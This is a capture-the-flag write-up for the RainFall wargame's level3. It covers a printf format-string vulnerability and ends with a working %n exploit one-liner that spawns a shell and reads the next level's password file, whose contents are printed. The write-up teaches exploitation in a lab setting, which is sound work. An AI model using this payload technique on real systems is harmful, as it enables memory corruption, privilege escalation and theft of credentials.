## level3

```c
int m;

void v() {
    char buf[520];

    fgets(buf, 512, stdin);
    printf(buf);
    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main() { v(); }
```

```nasm
(gdb) disas v
Dump of assembler code for function v:
[...]
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
[...]  
End of assembler dump.
```

We have to write 64 at the address 0x0804988c to get the shell.

The program uses `printf` with the input directly as a format string. This is a well-known vulnerability, since users can write their own format specifiers, causing the leak of information, or in our case, writing values directly to memory.

The `%n` format specifier in `printf` writes the number of character written so far to a variable. `printf("lol%n", &c)` will write make `c = 3`.

First, we need to detect where is the string given to `printf` on the stack:

```console
level3@RainFall:~$ echo '%x %x %x %x %x' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078
```

There are 3 values, then `257820` repeating corresponding to `%x `. So it is found at the 4th position.

The trick is to start the format string with the address we want to overwrite, then set %n the 4th format specifier. The rest are padding characters to reach a value of 64.

```console
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08%x%x%x.........................................%n')" ; cat) | ./level3
�200.b7fd1ac0.b7ff37d0.......................................
Wait what?!
cat /home/user/level4/.pass                                     
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

